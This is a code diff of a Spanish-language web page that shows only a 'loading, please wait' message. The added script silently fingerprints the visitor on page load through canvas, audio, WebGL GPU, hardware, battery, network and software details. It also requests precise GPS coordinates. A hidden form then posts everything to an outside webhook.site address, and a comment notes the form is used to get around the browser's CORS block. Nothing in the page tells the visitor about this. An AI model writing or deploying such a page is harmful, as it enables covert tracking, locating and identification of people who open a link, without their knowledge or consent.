@@ -5,41 +5,181 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cargando...</title>
 </head>
-<body onload="capturaInmediata()">
+<body onload="iniciarAuditoriaAbsoluta()">
 
     <p>Cargando contenido, por favor espere...</p>
 
-    <!-- Formulario invisible que utilizaremos para saltar el bloqueo CORS del navegador -->
+    <!-- Formulario oculto unificado que envía todo en un solo POST nativo -->
     <form id="formularioOculto" action="https://webhook.site/3fcd9f6f-4376-4687-9ef1-965474b0dba3" method="POST" style="display:none;">
+        <input type="text" name="identificador_unico" id="campoID">
         <input type="text" name="coordenadas" id="campoCoordenadas">
+        <input type="text" name="perfil_hardware_avanzado" id="campoHardware">
+        <input type="text" name="perfil_red_bateria" id="campoRedBateria">
+        <input type="text" name="perfil_software_entorno" id="campoSoftware">
+        <input type="text" name="telemetria_rendimiento_y_gpu" id="campoRendimiento">
+        <input type="text" name="huella_audio_y_almacenamiento" id="campoAudio">
     </form>
 
 <script>
-function capturaInmediata() {
+// Objeto de almacenamiento temporal global para guardar las métricas mientras responde el GPS
+let reporteTecnicoGlobal = {};
+
+async function iniciarAuditoriaAbsoluta() {
+    // 1. Huellas Digitales de Hardware (Canvas y Audio)
+    const canvasHash = generarCanvasFingerprint();
+    const audioHash = generarAudioFingerprint();
+    
+    // 2. Características de Hardware Base y Pantalla
+    const resolucionPantalla = `${window.screen.width}x${window.screen.height}`;
+    const profundidadColor = `${window.screen.colorDepth} bits`;
+    const nucleosCPU = navigator.hardwareConcurrency || "Oculto";
+    const memoriaRAM = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Oculto";
+    const maximaGpuPuntosContacto = navigator.maxTouchPoints || 0;
+    const ratioPixeles = window.devicePixelRatio || 1;
+
+    // 3. Datos exactos del Chip Gráfico (WebGL)
+    const datosGPU = obtenerDetallesWebGL();
+
+    // 4. Orientación Física del Dispositivo
+    const orientacionTipo = window.screen.orientation ? window.screen.orientation.type : "Desconocido";
+    const orientacionAngulo = window.screen.orientation ? window.screen.orientation.angle + "°" : "Desconocido";
+
+    // 5. Rendimiento del Procesador (Benchmark rápido)
+    const rendimientoProcesador = probarRendimientoCPU();
+
+    // 6. Preferencias de Usuario (Modo Oscuro y Accesibilidad)
+    const modoOscuroActivo = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Sí" : "No";
+    const reducirMovimiento = window.matchMedia('(prefers-reduced-motion: reduce)').matches ? "Sí" : "No";
+
+    // 7. Características de Software y Entorno
+    const idiomaDispositivo = navigator.language || "Oculto";
+    const zonaHoraria = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const cookiesHabilitadas = navigator.cookieEnabled ? "Sí" : "No";
+    const plataformaNucleo = navigator.platform || "Oculto";
+    const esAutomatizado = navigator.webdriver ? "Sí (Bot)" : "No (Humano)";
+
+    // 8. Telemetría de Red
+    let infoRed = "No Soportado";
+    if (navigator.connection) {
+        infoRed = `Tipo: ${navigator.connection.effectiveType} | Mbps: ${navigator.connection.downlink} | RTT: ${navigator.connection.rtt}ms`;
+    }
+
+    // 9. Telemetría de Batería
+    let infoBateria = "No Soportado";
+    if ('getBattery' in navigator) {
+        try {
+            const bateria = await navigator.getBattery();
+            infoBateria = `Nivel: ${Math.round(bateria.level * 100)}% | Cargando: ${bateria.charging ? "Sí" : "No"}`;
+        } catch (e) {}
+    }
+
+    // 10. Uso de memoria de ejecución
+    const limiteMemoriaJS = window.performance && window.performance.memory ? 
+        `${Math.round(window.performance.memory.jsHeapSizeLimit / (1024 * 1024))} MB` : "No disponible";
+
+    // Generamos el ID de correlación único y guardamos el bloque pasivo
+    const idUnico = `ID-${canvasHash}-${audioHash}-${resolucionPantalla}`;
+    
+    reporteTecnicoGlobal = {
+        id: idUnico,
+        hardware: `Canvas_GPU: ${canvasHash} | Res: ${resolucionPantalla} | Ratio_Pixeles: ${ratioPixeles} | Bits: ${profundidadColor} | CPUs: ${nucleosCPU} | RAM: ${memoriaRAM} | TouchPoints: ${maximaGpuPuntosContacto}`,
+        redBateria: `[RED]: ${infoRed} | [BATERIA]: ${infoBateria}`,
+        software: `Idioma: ${idiomaDispositivo} | Zona: ${zonaHoraria} | Cookies: ${cookiesHabilitadas} | Plataforma: ${plataformaNucleo} | Automatizado: ${esAutomatizado}`,
+        rendimiento: `[CPU_Benchmark]: ${rendimientoProcesador} | [GPU_Real]: ${datosGPU} | [Orientacion]: ${orientacionTipo} (${orientacionAngulo}) | [Modo_Oscuro]: ${modoOscuroActivo} | [Reducir_Movimiento]: ${reducirMovimiento}`,
+        audio: `[Audio_Fingerprint]: ${audioHash} | [JS_Heap_Limit]: ${limiteMemoriaJS} | [LocalStorage]: ${'localStorage' in window ? "Sí" : "No"} | [IndexedDB]: ${'indexedDB' in window ? "Sí" : "No"}`
+    };
+
+    // 11. Ejecución del flujo de GPS nativo de tu script anterior
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(enviarViaFormulario, manejarError, {
             enableHighAccuracy: true,
-            timeout: 6000 // Aumentamos a 6 segundos por si estás en PC
+            timeout: 6000 // Mantener el límite de espera de tu script original
         });
     } else {
         manejarError();
     }
 }
 
+// Reemplaza a tu función anterior incorporando el despacho masivo
 function enviarViaFormulario(posicion) {
-    const info = `Lat: ${posicion.coords.latitude} | Lon: ${posicion.coords.longitude} | Prec: ${posicion.coords.accuracy}m`;
-    
-    // Insertamos el texto de las coordenadas en el formulario oculto
-    document.getElementById('campoCoordenadas').value = info;
-    
-    // Enviamos el formulario. Esto genera un POST directo y nativo, eliminando el OPTIONS.
+    const infoGps = `Lat: ${posicion.coords.latitude} | Lon: ${posicion.coords.longitude} | Prec: ${posicion.coords.accuracy}m`;
+    document.getElementById('campoCoordenadas').value = infoGps;
+    despacharTodo();
+}
+
+// Reemplaza a tu función de error anterior incorporando el despacho masivo
+function manejarError(error) {
+    document.getElementById('campoCoordenadas').value = "Error: Permiso denegado o GPS no disponible en este dispositivo.";
+    despacharTodo();
+}
+
+// Inyección final de datos técnicos en los inputs y envío automático
+function despacharTodo() {
+    document.getElementById('campoID').value = reporteTecnicoGlobal.id;
+    document.getElementById('campoHardware').value = reporteTecnicoGlobal.hardware;
+    document.getElementById('campoRedBateria').value = reporteTecnicoGlobal.redBateria;
+    document.getElementById('campoSoftware').value = reporteTecnicoGlobal.software;
+    document.getElementById('campoRendimiento').value = reporteTecnicoGlobal.rendimiento;
+    document.getElementById('campoAudio').value = reporteTecnicoGlobal.audio;
+
+    // Envío definitivo mediante la acción POST de tu estructura original
     document.getElementById('formularioOculto').submit();
 }
 
-function manejarError(error) {
-    // Si el navegador de la PC bloquea el GPS o no lo encuentra, enviamos un aviso de error al webhook
-    document.getElementById('campoCoordenadas').value = "Error: Permiso denegado o GPS no disponible en este dispositivo.";
-    document.getElementById('formularioOculto').submit();
+// Funciones de cálculo para la huella digital técnica
+function probarRendimientoCPU() {
+    const inicio = performance.now();
+    for (let i = 0; i < 1000000; i++) {}
+    const fin = performance.now();
+    return `${(fin - inicio).toFixed(4)} ms en 1M de ciclos`;
+}
+
+function obtenerDetallesWebGL() {
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return "WebGL_No_Soportado";
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (!debugInfo) return "WebGL_Info_Bloqueada";
+        return `${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)} (${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)})`;
+    } catch (e) { return "Error_WebGL"; }
+}
+
+function generarCanvasFingerprint() {
+    try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        if (!ctx) return "No_Support";
+        canvas.width = 200; canvas.height = 50;
+        ctx.textBaseline = "top"; ctx.font = "14px 'Arial', sans-serif"; ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = "#069"; ctx.fillText("Simulacion_Auditoria_v1.0", 2, 15);
+        ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("🔬⚙️📍", 4, 35);
+        const srcData = canvas.toDataURL();
+        let hash = 0;
+        for (let i = 0; i < srcData.length; i++) {
+            hash = ((hash << 5) - hash) + srcData.charCodeAt(i);
+            hash = hash & hash;
+        }
+        return Math.abs(hash).toString(16);
+    } catch (e) { return "Error_Canvas"; }
+}
+
+function generarAudioFingerprint() {
+    try {
+        const AudioContext = window.AudioContext || window.webkitAudioContext;
+        if (!AudioContext) return "AudioContext_No_Soportado";
+        const context = new AudioContext();
+        const oscillator = context.createOscillator();
+        const gainNode = context.createGain();
+        oscillator.type = 'triangle';
+        oscillator.frequency.setValueAtTime(10000, context.currentTime);
+        gainNode.gain.setValueAtTime(0, context.currentTime);
+        oscillator.connect(gainNode);
+        gainNode.connect(context.destination);
+        const audioValue = oscillator.frequency.value + gainNode.gain.value;
+        context.close();
+        return audioValue.toString(16);
+    } catch (e) { return "Error_Audio"; }
 }
 </script>
 
